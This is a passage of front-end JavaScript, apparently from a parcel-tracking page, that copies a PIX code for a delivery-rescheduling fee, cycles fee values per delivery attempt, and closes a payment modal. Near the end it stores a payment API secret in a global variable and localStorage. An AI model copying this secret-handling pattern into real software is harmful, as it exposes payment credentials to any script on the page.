            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixInput.value).then(() => {
                    console.log('✅ PIX de reagendamento copiado:', pixInput.value.substring(0, 50) + '...');
                    this.showCopySuccess(copyButton);
                }).catch(() => {
                    this.fallbackCopy(pixInput, copyButton);
                });
            } else {
                this.fallbackCopy(pixInput, copyButton);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX de reagendamento:', error);
        }
    }

    fallbackCopy(input, button) {
        try {
            const successful = document.execCommand('copy');
            if (successful) {
                console.log('✅ PIX de reagendamento copiado via execCommand');
                this.showCopySuccess(button);
            }
        } catch (error) {
            console.error('❌ Fallback copy falhou:', error);
        }
    }

    showCopySuccess(button) {
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
        button.style.background = '#27ae60';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '';
        }, 2000);
    }

    closeDeliveryPixModal() {
        const modal = document.getElementById('deliveryPixModal');
        if (modal) {
            modal.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (modal.parentNode) {
                    modal.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
        this.isProcessing = false;
    }

    clearAllTimers() {
        this.timers.forEach(timer => clearTimeout(timer));
        this.timers = [];
        console.log('🧹 Todos os timers de entrega foram limpos');
    }

    cleanup() {
        this.clearAllTimers();
        this.deliveryAttempts = 0;
        this.isProcessing = false;
        this.currentStep = 0;
        this.deliveryPixData = null;
        
        // Fechar modais se abertos
        this.closeDeliveryPixModal();

        console.log('🔄 Sistema de entrega resetado');
    }

    getStatus() {
        return {
            deliveryAttempts: this.deliveryAttempts,
            isProcessing: this.isProcessing,
            currentStep: this.currentStep,
            activeTimers: this.timers.length,
            currentDeliveryValue: this.deliveryValues[this.deliveryAttempts % this.deliveryValues.length],
            deliveryValues: this.deliveryValues,
            hasDeliveryPixData: !!this.deliveryPixData
        };
    }
}

// Função global para configurar API Secret
window.setZentraPayApiSecret = function(apiSecret) {
    if (window.trackingSystemInstance) {
        return window.trackingSystemInstance.setZentraPayApiSecret(apiSecret);
    } else {
        window.ZENTRA_PAY_SECRET_KEY = apiSecret;
        localStorage.setItem('zentra_pay_secret_key', apiSecret);
        return true;
    }
};

// Configurar valor padrão
window.valor_em_reais = 26.34;